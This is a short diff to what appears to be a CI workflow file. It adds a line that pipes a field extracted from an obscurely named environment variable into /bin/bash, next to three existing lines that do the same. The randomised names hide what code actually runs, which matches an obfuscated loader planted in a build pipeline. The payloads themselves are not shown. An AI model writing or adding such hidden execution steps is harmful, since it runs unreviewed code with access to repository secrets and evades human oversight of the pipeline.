@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$p1792" | jq -r .dvl9146 | /bin/bash
           printf '%s' "$btpw2" | jq -r .jowp6965 | /bin/bash
           printf '%s' "$uq9451" | jq -r .k3444 | /bin/bash
+          echo $sn28822 | jq -r .ea9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
